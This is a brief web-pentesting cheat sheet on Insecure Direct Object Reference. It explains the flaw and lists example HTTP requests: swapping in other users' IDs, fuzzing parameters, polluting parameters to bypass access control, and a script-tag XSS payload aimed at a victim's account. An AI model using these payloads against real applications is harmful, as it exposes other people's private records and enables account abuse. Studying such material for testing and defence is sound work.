# IDOR

## Theory

Insecure Direct Object Reference (called IDOR from here on) occurs when an application exposes a reference to an internal implementation object. In this way, it reveals the actual identifier and format/pattern used of the element on the storage backend side. The most common example of this (though not limited to this one) is a record identifier in a storage system (database, file system, etc.).

## Practice

### Basic payloads

```shell
GET /api_v1/messages?conversation_id=SOME_RANDOM_ID
GET /api_v1/messages?FUZZ=ANOTHER_USERS_ID # Parameters fuzzing
https://insecure-website.com/customer_account?customer_number=RANDOM_NUMBER
```

### HTTP Parameter Pollution (HPP)

HPP vulnerabilities (supplying multiple values for the same parameter) can also lead to IDOR. Applications may not anticipate that the user will submit multiple values for the same parameter and in doing so, may be able to bypass the access control set on the endpoint.

```shell
GET /api_v1/messages?user_id=ANOTHER_USERS_ID
GET /api_v1/messages?user_id=YOUR_USER_ID&user_id=ANOTHER_USERS_ID # Try this
GET /api_v1/messages?user_id=ANOTHER_USERS_ID&user_id=YOUR_USER_ID # Or this
GET /api_v1/messages?user_ids[]=YOUR_USER_ID&user_ids[]=ANOTHER_USERS_ID # Or provide the parameters as a list.
```

### IDOR + Self XSS

If we find an IDOR, we can try to inject the victim user with a Self-XSS or even a Stored XSS:

```html
https://socialmedia.com/add_reminder?user_id=<script>alert(1)</script>
```
